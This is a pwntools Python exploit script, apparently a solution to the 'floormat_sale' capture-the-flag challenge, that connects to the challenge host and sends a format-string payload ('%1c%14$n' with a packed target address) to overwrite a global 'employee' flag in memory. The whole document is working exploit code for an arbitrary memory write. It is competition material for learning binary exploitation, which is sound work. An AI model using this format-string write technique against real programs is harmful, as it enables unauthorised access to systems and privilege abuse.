#!/usr/bin/env python3

from pwn import *

exe = ELF("./floormat_sale_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("floormatsale.ctf.intigriti.io", 1339)

    return r


def main():
    r = conn()
    # input()
    employee = 0x40408c
    payload = f'%{0x1}c%14$n'.encode()
    payload = payload.ljust(0x20, b'A')
    payload += p64(employee)
    r.sendline(b'6')
    r.sendline(payload)
    # pause()
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
